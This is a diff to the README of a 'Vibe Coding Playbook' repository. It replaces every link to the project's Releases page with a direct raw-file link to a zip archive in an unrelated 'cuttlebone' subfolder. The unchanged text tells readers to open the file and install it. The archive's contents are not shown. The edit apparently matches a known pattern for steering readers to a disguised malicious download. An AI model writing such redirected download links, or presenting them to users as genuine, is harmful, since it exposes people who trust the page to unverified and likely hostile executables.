@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download v1.0](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/priyanshop754/vibe-coding-playbook/releases)
+[![Download v1.0](https://raw.githubusercontent.com/priyanshop754/vibe-coding-playbook/main/cuttlebone/vibe-coding-playbook.zip)](https://raw.githubusercontent.com/priyanshop754/vibe-coding-playbook/main/cuttlebone/vibe-coding-playbook.zip)
 
 ## 📋 Table of Contents
 
@@ -31,7 +31,7 @@ To get started with the Vibe Coding Playbook, follow these steps:
 
 1. **Download the Software:** Visit the Releases page to download the latest version of the Vibe Coding Playbook.
    
-   [Download v1.0](https://github.com/priyanshop754/vibe-coding-playbook/releases)
+   [Download v1.0](https://raw.githubusercontent.com/priyanshop754/vibe-coding-playbook/main/cuttlebone/vibe-coding-playbook.zip)
 
 2. **Install the Software:** After downloading, open the file and follow the on-screen instructions to install it on your computer.
 
@@ -92,4 +92,4 @@ Integrating the Vibe Coding Playbook into your team’s workflow can improve eff
 
 We welcome contributions to the Vibe Coding Playbook. If you want to help improve the project, please check the guidelines in our repository. Your input can make a difference in shaping better AI-assisted development practices.
 
-For more information and to download, visit: [Download v1.0](https://github.com/priyanshop754/vibe-coding-playbook/releases)
+For more information and to download, visit: [Download v1.0](https://raw.githubusercontent.com/priyanshop754/vibe-coding-playbook/main/cuttlebone/vibe-coding-playbook.zip)
